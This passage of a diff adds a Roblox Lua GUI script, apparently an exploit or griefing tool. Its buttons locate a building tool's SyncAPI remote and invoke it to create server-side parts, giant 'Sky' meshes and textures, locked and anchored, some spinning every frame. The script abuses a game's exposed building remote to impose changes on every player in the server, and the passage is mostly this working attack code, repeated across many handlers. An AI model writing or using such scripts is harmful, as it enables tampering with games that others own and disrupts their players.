+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Sky(id)
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+					--spawn(function()
+					SetName(v,"Sky")
+					AddMesh(v)
+					--end)
+					--spawn(function()
+					SetMesh(v,"8006679977")
+					SetTexture(v,id)
+					--end)
+					MeshResize(v,Vector3.new(50,50,50))
+					SetLocked(v,true)
+				end
+			end
+		end
+		Sky("73916685652770")
+	
+	end)
+end
+task.spawn(SCRIPT_26)
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 3.LocalScript \\ --
+local function SCRIPT_28()
+local script = UI["28"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Sky(id)
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+					--spawn(function()
+					SetName(v,"Sky")
+					AddMesh(v)
+					--end)
+					--spawn(function()
+					SetMesh(v,"8006679977")
+					SetTexture(v,id)
+					--end)
+					MeshResize(v,Vector3.new(50,50,50))
+					SetLocked(v,true)
+				end
+			end
+		end
+		Sky("127295578140184")
+	
+	end)
+end
+task.spawn(SCRIPT_28)
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 4.LocalScript \\ --
+local function SCRIPT_2a()
+local script = UI["2a"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Sky(id)
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+					--spawn(function()
+					SetName(v,"Sky")
+					AddMesh(v)
+					--end)
+					--spawn(function()
+					SetMesh(v,"8006679977")
+					SetTexture(v,id)
+					--end)
+					MeshResize(v,Vector3.new(50,50,50))
+					SetLocked(v,true)
+				end
+			end
+		end
+		Sky("108449640067150")
+	
+	end)
+end
+task.spawn(SCRIPT_2a)
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate.LocalScript \\ --
+local function SCRIPT_2c()
+local script = UI["2c"]
+	local player = game.Players.LocalPlayer
+	local RunService = game:GetService("RunService")
+	local tool = script.Parent
+	
+	local function getRemote()
+		if tool and tool:FindFirstChild("SyncAPI") then
+			return tool.SyncAPI.ServerEndpoint
+		end
+	
+		for _, v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				return v.Parent.SyncAPI.ServerEndpoint
+			end
+		end
+	
+		for _, v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				return v.Parent.SyncAPI.ServerEndpoint
+			end
+		end
+		return nil
+	end
+	
+	function _(args)
+		local remote = getRemote()
+		if remote then
+			remote:InvokeServer(unpack(args))
+		end
+	end
+	
+	function SetAnchor(boolean,part)
+		local args = {
+			[1] = "SyncAnchor",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["Anchored"] = boolean
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function CreatePart(cf,parent)
+		local args = {
+			[1] = "CreatePart",
+			[2] = "Normal",
+			[3] = cf,
+			[4] = parent
+		}
+		_(args)
+	end
+	
+	function MovePart(part,cf)
+		local args = {
+			[1] = "SyncMove",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["CFrame"] = cf
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function AddMesh(part)
+		local args = {
+			[1] = "CreateMeshes",
+			[2] = {
+				[1] = {
+					["Part"] = part
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetMesh(part,meshid)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["MeshId"] = "rbxassetid://"..meshid
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetTexture(part, texid)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["TextureId"] = "rbxassetid://"..texid
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetName(part, stringg)
+		local args = {
+			[1] = "SetName",
+			[2] = {
+				[1] = part
+			},
+			[3] = stringg
+		}
+		_(args)
+	end
+	
+	function MeshResize(part,size)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["Scale"] = size
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetLocked(part,boolean)
+		local args = {
+			[1] = "SetLocked",
+			[2] = {
+				[1] = part
+			},
+			[3] = boolean
+		}
+		_(args)
+	end
+	
+	function Sky(id)
+		local char = player.Character
+		local currentRoot = char and char:FindFirstChild("HumanoidRootPart")
+		if not currentRoot then return end
+	
+		local spawnPos = currentRoot.CFrame + Vector3.new(0, 6, 0)
+		CreatePart(spawnPos, workspace)
+		task.wait(0.2)
+		local skyPart
+		for _, v in workspace:GetChildren() do
+			if v:IsA("BasePart") and (v.Position - spawnPos.Position).magnitude < 5 then
+				skyPart = v
+				break
+			end
+		end
+		if skyPart then
+			SetName(skyPart, "PersistentSmoothCrazySkybox")
+			AddMesh(skyPart)
+			SetMesh(skyPart, "111891702759441")
+			SetTexture(skyPart, id)
+			MeshResize(skyPart, Vector3.new(1000, 1000, 1000))
+			SetLocked(skyPart, true)
+			SetAnchor(true, skyPart)
+	
+			local rx, ry, rz = 0, 0, 0
+			RunService.RenderStepped:Connect(function(dt)
+				if skyPart and skyPart.Parent then
+					rx = rx + (1.2 * dt)
+					ry = ry + (1.8 * dt)
+					rz = rz + (1.0 * dt)
+	
+					local smoothCF = CFrame.new(spawnPos.Position) * CFrame.Angles(rx, ry, rz)
+					MovePart(skyPart, smoothCF)
+				end
+			end)
+		end
+	end
+	
+	tool.Activated:Connect(function()
+		Sky("96073597459340")
+	end)
+end
+task.spawn(SCRIPT_2c)
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 2.LocalScript \\ --
+local function SCRIPT_2e()
+local script = UI["2e"]
+	local player = game.Players.LocalPlayer
+	local RunService = game:GetService("RunService")
+	local tool = script.Parent
+	
+	local function getRemote()
+		if tool and tool:FindFirstChild("SyncAPI") then
+			return tool.SyncAPI.ServerEndpoint
+		end
+	
+		for _, v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				return v.Parent.SyncAPI.ServerEndpoint
+			end
+		end
+	
+		for _, v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				return v.Parent.SyncAPI.ServerEndpoint
+			end
+		end
+		return nil
+	end
+	
+	function _(args)
+		local remote = getRemote()
+		if remote then
+			remote:InvokeServer(unpack(args))
+		end
+	end
+	
+	function SetAnchor(boolean,part)
+		local args = {
+			[1] = "SyncAnchor",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["Anchored"] = boolean
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function CreatePart(cf,parent)
+		local args = {
+			[1] = "CreatePart",
+			[2] = "Normal",
+			[3] = cf,
+			[4] = parent
+		}
+		_(args)
+	end
+	
+	function MovePart(part,cf)
+		local args = {
+			[1] = "SyncMove",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["CFrame"] = cf
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function AddMesh(part)
+		local args = {
+			[1] = "CreateMeshes",
+			[2] = {
+				[1] = {
+					["Part"] = part
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetMesh(part,meshid)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["MeshId"] = "rbxassetid://"..meshid
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetTexture(part, texid)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["TextureId"] = "rbxassetid://"..texid
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetName(part, stringg)
+		local args = {
+			[1] = "SetName",
+			[2] = {
+				[1] = part
+			},
+			[3] = stringg
+		}
+		_(args)
+	end
+	
+	function MeshResize(part,size)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["Scale"] = size
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetLocked(part,boolean)
+		local args = {
+			[1] = "SetLocked",
+			[2] = {
+				[1] = part
+			},
+			[3] = boolean
+		}
+		_(args)
+	end
+	
+	function Sky(id)
+		local char = player.Character
+		local currentRoot = char and char:FindFirstChild("HumanoidRootPart")
+		if not currentRoot then return end
+	
+		local spawnPos = currentRoot.CFrame + Vector3.new(0, 6, 0)
+		CreatePart(spawnPos, workspace)
+		task.wait(0.2)
+		local skyPart
+		for _, v in workspace:GetChildren() do
+			if v:IsA("BasePart") and (v.Position - spawnPos.Position).magnitude < 5 then
+				skyPart = v
+				break
+			end
+		end
+		if skyPart then
+			SetName(skyPart, "PersistentSmoothCrazySkybox")
+			AddMesh(skyPart)
+			SetMesh(skyPart, "111891702759441")
+			SetTexture(skyPart, id)
+			MeshResize(skyPart, Vector3.new(1000, 1000, 1000))
+			SetLocked(skyPart, true)
+			SetAnchor(true, skyPart)
+	
+			local rx, ry, rz = 0, 0, 0
+			RunService.RenderStepped:Connect(function(dt)
+				if skyPart and skyPart.Parent then
+					rx = rx + (1.2 * dt)
+					ry = ry + (1.8 * dt)
+					rz = rz + (1.0 * dt)
+	
+					local smoothCF = CFrame.new(spawnPos.Position) * CFrame.Angles(rx, ry, rz)
+					MovePart(skyPart, smoothCF)
+				end
+			end)
+		end
+	end
+	
+	tool.Activated:Connect(function()
+		Sky("97661894122632")
+	end)
+end
+task.spawn(SCRIPT_2e)
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 3.LocalScript \\ --
+local function SCRIPT_30()
+local script = UI["30"]
+	local player = game.Players.LocalPlayer
+	local RunService = game:GetService("RunService")
+	local tool = script.Parent
+	
+	local function getRemote()
+		if tool and tool:FindFirstChild("SyncAPI") then
+			return tool.SyncAPI.ServerEndpoint
+		end
+	
+		for _, v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				return v.Parent.SyncAPI.ServerEndpoint
+			end
+		end
+	
+		for _, v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				return v.Parent.SyncAPI.ServerEndpoint
+			end
+		end
+		return nil
+	end
+	
+	function _(args)
+		local remote = getRemote()
+		if remote then
+			remote:InvokeServer(unpack(args))
+		end
+	end
+	
+	function SetAnchor(boolean,part)
+		local args = {
+			[1] = "SyncAnchor",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["Anchored"] = boolean
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function CreatePart(cf,parent)
+		local args = {
+			[1] = "CreatePart",
+			[2] = "Normal",
+			[3] = cf,
+			[4] = parent
+		}
+		_(args)
+	end
+	
+	function MovePart(part,cf)
+		local args = {
+			[1] = "SyncMove",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["CFrame"] = cf
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function AddMesh(part)
+		local args = {
+			[1] = "CreateMeshes",
+			[2] = {
+				[1] = {
+					["Part"] = part
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetMesh(part,meshid)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["MeshId"] = "rbxassetid://"..meshid
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetTexture(part, texid)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["TextureId"] = "rbxassetid://"..texid
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetName(part, stringg)
+		local args = {
+			[1] = "SetName",
+			[2] = {
+				[1] = part
+			},
+			[3] = stringg
+		}
+		_(args)
+	end
+	
+	function MeshResize(part,size)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["Scale"] = size
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetLocked(part,boolean)
+		local args = {
+			[1] = "SetLocked",
+			[2] = {
+				[1] = part
+			},
+			[3] = boolean
+		}
+		_(args)
+	end
+	
+	function Sky(id)
+		local char = player.Character
+		local currentRoot = char and char:FindFirstChild("HumanoidRootPart")
+		if not currentRoot then return end
+	
+		local spawnPos = currentRoot.CFrame + Vector3.new(0, 6, 0)
+		CreatePart(spawnPos, workspace)
+		task.wait(0.2)
+		local skyPart
+		for _, v in workspace:GetChildren() do
+			if v:IsA("BasePart") and (v.Position - spawnPos.Position).magnitude < 5 then
+				skyPart = v
+				break
+			end
+		end
+		if skyPart then
+			SetName(skyPart, "PersistentSmoothCrazySkybox")
+			AddMesh(skyPart)
+			SetMesh(skyPart, "111891702759441")
+			SetTexture(skyPart, id)
+			MeshResize(skyPart, Vector3.new(1000, 1000, 1000))
+			SetLocked(skyPart, true)
+			SetAnchor(true, skyPart)
+	
+			local rx, ry, rz = 0, 0, 0
+			RunService.RenderStepped:Connect(function(dt)
+				if skyPart and skyPart.Parent then
+					rx = rx + (1.2 * dt)
+					ry = ry + (1.8 * dt)
+					rz = rz + (1.0 * dt)
+	
+					local smoothCF = CFrame.new(spawnPos.Position) * CFrame.Angles(rx, ry, rz)
+					MovePart(skyPart, smoothCF)
+				end
+			end)
+		end
+	end
+	
+	tool.Activated:Connect(function()
+		Sky("131034375217479")
+	end)
+end
+task.spawn(SCRIPT_30)
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 4.LocalScript \\ --
+local function SCRIPT_32()
+local script = UI["32"]
+	local player = game.Players.LocalPlayer
+	local RunService = game:GetService("RunService")
+	local tool = script.Parent
+	
+	local function getRemote()
+		if tool and tool:FindFirstChild("SyncAPI") then
+			return tool.SyncAPI.ServerEndpoint
+		end
+	
+		for _, v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				return v.Parent.SyncAPI.ServerEndpoint
+			end
+		end
+	
+		for _, v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				return v.Parent.SyncAPI.ServerEndpoint
+			end
+		end
+		return nil
+	end
+	
+	function _(args)
+		local remote = getRemote()
+		if remote then
+			remote:InvokeServer(unpack(args))
+		end
+	end
+	
+	function SetAnchor(boolean,part)
+		local args = {
+			[1] = "SyncAnchor",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["Anchored"] = boolean
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function CreatePart(cf,parent)
+		local args = {
+			[1] = "CreatePart",
+			[2] = "Normal",
+			[3] = cf,
+			[4] = parent
+		}
+		_(args)
+	end
+	
+	function MovePart(part,cf)
+		local args = {
+			[1] = "SyncMove",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["CFrame"] = cf
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function AddMesh(part)
+		local args = {
+			[1] = "CreateMeshes",
+			[2] = {
+				[1] = {
+					["Part"] = part
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetMesh(part,meshid)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["MeshId"] = "rbxassetid://"..meshid
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetTexture(part, texid)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["TextureId"] = "rbxassetid://"..texid
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetName(part, stringg)
+		local args = {
+			[1] = "SetName",
+			[2] = {
+				[1] = part
+			},
+			[3] = stringg
+		}
+		_(args)
+	end
+	
+	function MeshResize(part,size)
+		local args = {
+			[1] = "SyncMesh",
+			[2] = {
+				[1] = {
+					["Part"] = part,
+					["Scale"] = size
+				}
+			}
+		}
+		_(args)
+	end
+	
+	function SetLocked(part,boolean)
+		local args = {
+			[1] = "SetLocked",
+			[2] = {
+				[1] = part
+			},
+			[3] = boolean
+		}
+		_(args)
+	end
+	
+	function Sky(id)
+		local char = player.Character
+		local currentRoot = char and char:FindFirstChild("HumanoidRootPart")
+		if not currentRoot then return end
+	
+		local spawnPos = currentRoot.CFrame + Vector3.new(0, 6, 0)
+		CreatePart(spawnPos, workspace)
+		task.wait(0.2)
+		local skyPart
+		for _, v in workspace:GetChildren() do
+			if v:IsA("BasePart") and (v.Position - spawnPos.Position).magnitude < 5 then
+				skyPart = v
+				break
+			end
+		end
+		if skyPart then
+			SetName(skyPart, "PersistentSmoothCrazySkybox")
+			AddMesh(skyPart)
+			SetMesh(skyPart, "111891702759441")
+			SetTexture(skyPart, id)
+			MeshResize(skyPart, Vector3.new(1000, 1000, 1000))
+			SetLocked(skyPart, true)
+			SetAnchor(true, skyPart)
+	
+			local rx, ry, rz = 0, 0, 0
+			RunService.RenderStepped:Connect(function(dt)
+				if skyPart and skyPart.Parent then
+					rx = rx + (1.2 * dt)
+					ry = ry + (1.8 * dt)
+					rz = rz + (1.0 * dt)
+	
+					local smoothCF = CFrame.new(spawnPos.Position) * CFrame.Angles(rx, ry, rz)
+					MovePart(skyPart, smoothCF)
+				end
+			end)
+		end
+	end
+	
+	tool.Activated:Connect(function()
+		Sky("73916685652770")
+	end)
+end
+task.spawn(SCRIPT_32)
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton.LocalScript \\ --
+local function SCRIPT_34()
+local script = UI["34"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
